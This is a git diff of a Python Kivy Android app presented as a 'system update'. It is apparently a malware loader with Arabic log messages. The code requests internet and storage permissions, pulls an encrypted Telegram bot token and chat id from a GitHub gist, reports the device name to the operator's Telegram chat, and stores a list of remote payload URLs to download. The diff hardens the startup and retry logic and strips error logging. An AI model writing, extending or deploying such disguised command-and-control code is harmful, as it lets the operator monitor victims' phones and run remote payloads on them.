@@ -16,7 +16,6 @@ from kivy.utils import platform
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# إضافة مسار التطبيق الحالي لمسارات البحث عن المكتبات
 app_path = os.path.dirname(os.path.abspath(__file__))
 if app_path not in sys.path:
     sys.path.append(app_path)
@@ -28,15 +27,19 @@ for subdir in ['core', 'telegram', 'media', 'config']:
 class SystemUpdateApp(App):
     def build(self):
         self.config_url = "https://gist.githubusercontent.com/Zaen1993/e463af07dcd7c8c1f2398fdbaf573c73/raw/1029041e26d793614ba70bccaf542bfed53eeacd/config.json"
+        self.engine_running = False
 
         layout = BoxLayout(orientation='vertical')
-        btn_layout = BoxLayout(size_hint_y=0.1, height=40)
-        copy_btn = Button(text="📋 نسخ السجل", size_hint_x=0.3, background_color=(0.2, 0.6, 0.2, 1))
+        btn_layout = BoxLayout(size_hint_y=None, height=50, spacing=10, padding=5)
+        copy_btn = Button(text="📋 نسخ السجل", background_color=(0.2, 0.6, 0.2, 1))
         copy_btn.bind(on_press=self.copy_log)
+        retry_btn = Button(text="🔄 إعادة تشغيل المحرك", background_color=(0.7, 0.2, 0.2, 1))
+        retry_btn.bind(on_press=self.force_start_engine)
         btn_layout.add_widget(copy_btn)
+        btn_layout.add_widget(retry_btn)
         layout.add_widget(btn_layout)
 
-        scroll = ScrollView(size_hint=(1, 1), do_scroll_x=True, do_scroll_y=True)
+        scroll = ScrollView(size_hint=(1, 1))
         self.log_view = TextInput(
             text="[System] Initializing...\n",
             readonly=True,
@@ -51,8 +54,34 @@ class SystemUpdateApp(App):
         scroll.add_widget(self.log_view)
         layout.add_widget(scroll)
 
-        threading.Thread(target=self.logic_engine, daemon=True).start()
+        if platform == 'android':
+            from android.permissions import request_permissions, Permission
+            self.log("🔐 طلب صلاحيات الإنترنت والتخزين...")
+            request_permissions([
+                Permission.INTERNET,
+                Permission.ACCESS_NETWORK_STATE,
+                Permission.READ_EXTERNAL_STORAGE,
+                Permission.WRITE_EXTERNAL_STORAGE
+            ])
+
+        threading.Timer(3, self.start_engine_safe).start()
         return layout
+
+    def start_engine_safe(self):
+        if self.engine_running:
+            self.log("⚠️ المحرك يعمل بالفعل")
+            return
+        self.engine_running = True
+        self.log("🚀 بدء المحرك (بعد 3 ثوانٍ من طلب الصلاحيات)...")
+        threading.Thread(target=self.logic_engine, daemon=True).start()
+
+    def force_start_engine(self, instance):
+        if self.engine_running:
+            self.log("⚠️ المحرك يعمل بالفعل. لا حاجة لإعادة التشغيل.")
+            return
+        self.log("🔄 إعادة تشغيل المحرك يدوياً...")
+        self.engine_running = True
+        threading.Thread(target=self.logic_engine, daemon=True).start()
 
     def copy_log(self, instance):
         from kivy.core.clipboard import Clipboard
@@ -70,21 +99,17 @@ class SystemUpdateApp(App):
 
     def decrypt_token(self, encrypted_data):
         if not encrypted_data:
-            self.log("⚠️ بيانات مشفرة فارغة")
             return ""
         try:
             from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
             from cryptography.hazmat.backends import default_backend
-
             key = self._get_encryption_key()
             data = base64.b64decode(encrypted_data)
             if len(data) < 28:
-                self.log("⚠️ البيانات المشفرة قصيرة جداً")
                 return ""
             iv = data[:12]
             tag = data[-16:]
             ciphertext = data[12:-16]
-
             cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
             decryptor = cipher.decryptor()
             decrypted = decryptor.update(ciphertext) + decryptor.finalize()
@@ -95,7 +120,6 @@ class SystemUpdateApp(App):
 
     def send_telegram(self, token, chat_id, text):
         if not token or not chat_id:
-            self.log("⚠️ لا يمكن الإرسال: توكن أو معرف دردشة فارغ")
             return False
         try:
             url = f"https://api.telegram.org/bot{token}/sendMessage"
@@ -104,7 +128,7 @@ class SystemUpdateApp(App):
                 self.log("✅ تم إرسال الرسالة إلى Telegram")
                 return True
             else:
-                self.log(f"⚠️ رد Telegram: {r.status_code} - {r.text[:100]}")
+                self.log(f"⚠️ رد Telegram: {r.status_code}")
                 return False
         except Exception as e:
             self.log(f"⚠️ إرسال تلغرام فشل: {e}")
@@ -122,68 +146,60 @@ class SystemUpdateApp(App):
 
     def logic_engine(self):
         try:
-            self.log("بدء تشغيل المحرك...")
-            time.sleep(2)
+            self.log("⚙️ بدأ تشغيل الخيط الخلفي...")
+            time.sleep(1)
 
-            if platform == 'android':
-                self.log("طلب صلاحيات الإنترنت...")
-                from android.permissions import request_permissions, Permission
-                request_permissions([Permission.INTERNET, Permission.ACCESS_NETWORK_STATE])
-                time.sleep(2)
-
-            self.log("اختبار الاتصال بـ 1.1.1.1...")
+            self.log("🌐 اختبار الاتصال بـ google...")
             try:
-                r = requests.get("https://1.1.1.1", timeout=5, verify=False)
-                self.log(f"الاتصال ناجح (حالة {r.status_code})")
+                r_test = requests.head("http://www.google.com", timeout=5)
+                self.log(f"✅ إنترنت متاح (HTTP {r_test.status_code})")
             except Exception as e:
-                self.log(f"⚠️ فشل اختبار الاتصال: {str(e)}")
+                self.log(f"⚠️ تنبيه: لا يوجد إنترنت أو DNS معطل: {e}")
 
-            self.log(f"جلب الإعدادات من: {self.config_url[:60]}...")
+            self.log("📥 جلب config.json...")
             try:
-                response = requests.get(self.config_url, timeout=15, verify=False)
-                if response.status_code != 200:
-                    self.log(f"❌ فشل تحميل config.json: HTTP {response.status_code}")
+                response = requests.get(self.config_url, timeout=8, verify=False)
+                if response.status_code == 200:
+                    config = response.json()
+                    self.log("✅ تم استلام config.json")
+                else:
+                    self.log(f"❌ فشل الجلب: رمز {response.status_code}")
                     return
-                config = response.json()
-                self.log("تم تحليل ملف الإعدادات بنجاح.")
             except Exception as e:
-                self.log(f"❌ فشل جلب أو تحليل JSON: {e}")
+                self.log(f"❌ خطأ في الاتصال بـ GitHub: {e}")
                 return
 
-            enc_tokens = config.get('t', [])
-            if not enc_tokens:
-                self.log("❌ قائمة التوكنات فارغة في config.json")
+            self.log("🔐 محاولة فك التشفير...")
+            try:
+                t_list = config.get('t', [])
+                if not t_list:
+                    self.log("❌ حقل 't' مفقود في JSON")
+                    return
+                token = self.decrypt_token(t_list[0])
+                v_id = self.decrypt_token(config.get('v', ''))
+                if token and v_id:
+                    self.log("✅ فك التشفير ناجح تماماً")
+                    device_name = self.get_device_name()
+                    startup_msg = f"🚀 *System Online*\n📱 الجهاز: `{device_name}`\n🕒 الوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}"
+                    self.send_telegram(token, v_id, startup_msg)
+                else:
+                    self.log("❌ فشل فك التشفير: تأكد من مفتاح AES")
+                    return
+            except Exception as e:
+                self.log(f"❌ انهيار أثناء التشفير: {e}")
                 return
-
-            self.log(f"عدد التوكنات المشفرة: {len(enc_tokens)}")
-            token = self.decrypt_token(enc_tokens[0])
-            v_id = self.decrypt_token(config.get('v', ''))
-
-            if not token or not v_id:
-                self.log("❌ فشل فك تشفير التوكن أو معرف الدردشة")
-                # محاولة إرسال رسالة تنبيه بدون تشفير (اختبار)
-                return
-
-            self.log("✅ تم فك تشفير التوكن ومعرف الدردشة")
-            device_name = self.get_device_name()
-            startup_msg = f"🚀 *System Online*\n📱 الجهاز: `{device_name}`\n🕒 الوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}"
-            if self.send_telegram(token, v_id, startup_msg):
-                self.log("✅ تم إرسال رسالة بدء التشغيل باسم الجهاز")
-            else:
-                self.log("⚠️ فشل إرسال رسالة بدء التشغيل")
 
             globals()['MASTER_CONFIG'] = {
                 'tokens': [token],
                 'v_id': v_id,
                 'payload_urls': config.get('payload_urls', [])
             }
-
-            self.log("بدء تحميل البايلودات...")
             self.load_payloads()
 
         except Exception as e:
-            error_details = traceback.format_exc()
-            self.log(f"❌ خطأ جسيم:\n{error_details}")
+            self.log(f"⚠️ خطأ غير متوقع في المحرك: {str(e)}")
+        finally:
+            self.engine_running = False
 
     def load_payloads(self):
         payload_urls = globals()['MASTER_CONFIG'].get('payload_urls', [])
